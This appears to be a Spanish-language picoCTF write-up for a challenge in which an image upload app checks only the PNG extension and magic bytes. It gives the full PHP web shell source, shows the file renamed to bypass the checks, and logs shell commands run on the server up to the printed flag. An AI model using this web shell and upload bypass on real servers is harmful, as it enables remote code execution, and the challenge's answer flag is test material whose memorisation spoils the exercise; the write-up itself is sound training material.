#Software #Hacking #WebExplotation #Web #Internet 
# Definición
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:63789/)!
# Hints
- (none)
# Solución
Primero ingresamos a [[robots.txt]] con la esperanza de encontrar algo que nos pueda guiar.
[http://atlas.picoctf.net:51596/robots.txt](http://atlas.picoctf.net:51596/robots.txt):

User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/  
  
[http://atlas.picoctf.net:51596/instructions.txt](http://atlas.picoctf.net:51596/instructions.txt):  
  
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
  
[[webshell en Php]] -> lo utilizamos para ejecutar algo del lado del servidor (nos apoyamos de [[nano]] para crear el archivo [[PHP|.php]])
  
```bash
┌──(kali㉿kali)-[~]  
└─$ nano webshell.php  
```
  
No podemos subir archivos que no sean .png  
  
```bash
┌──(kali㉿kali)-[~]  
└─$ cp webshell.php webshell.php.png  
```

Al intentar subirlo los magic bytes no coinciden  
```
Error: The file is not a valid PNG image: 3c3f7068  
```
  
```bash
┌──(kali㉿kali)-[~]  
└─$ nano webshell.php.png  
```
  
```php
PNG  
<?php  
if(isset($_GET['cmd'])) {  
        echo "<pre>";  
        system($_GET['cmd']);  
        echo "</pre>";  
}  
?>  
```
  
Verificamos que coincidan los bits magicos  
```bash
┌──(kali㉿kali)-[~]  
└─$ xxd webshell.php.png   
00000000: 504e 470a 3c3f 7068 700a 6966 2869 7373  PNG.<?php.if(iss  
00000010: 6574 2824 5f47 4554 5b27 636d 6427 5d29  et($_GET['cmd'])  
00000020: 2920 7b0a 0965 6368 6f20 223c 7072 653e  ) {..echo "<pre>  
00000030: 223b 0a09 7379 7374 656d 2824 5f47 4554  ";..system($_GET  
00000040: 5b27 636d 6427 5d29 3b0a 0965 6368 6f20  ['cmd']);..echo   
00000050: 223c 2f70 7265 3e22 3b0a 7d0a 3f3e 0a    "</pre>";.}.?>.  
```
  
[http://atlas.picoctf.net:51596/uploads/webshell.php.png?cmd=ls](http://atlas.picoctf.net:51596/uploads/webshell.php.png?cmd=ls)  

Pero no funciona  
  
```bash
┌──(kali㉿kali)-[~]  
└─$ mv webshell.php.png webshell.png.php  
```
  
[http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls)  
```
PNG
webshell.php.png
webshell.png.php
```
  
[http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=pwd](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=pwd)  
```
PNG
/var/www/html/uploads
```
  
[http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls) ..  
```
PNG
GQ4DOOBVMMYGK.txt
index.php
instructions.txt
robots.txt
uploads
```
  
[http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=cat%20../GQ4DOOBVMMYGK.txt](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=cat%20../GQ4DOOBVMMYGK.txt)  
```
PNG
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} */
```
## Respuesta
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}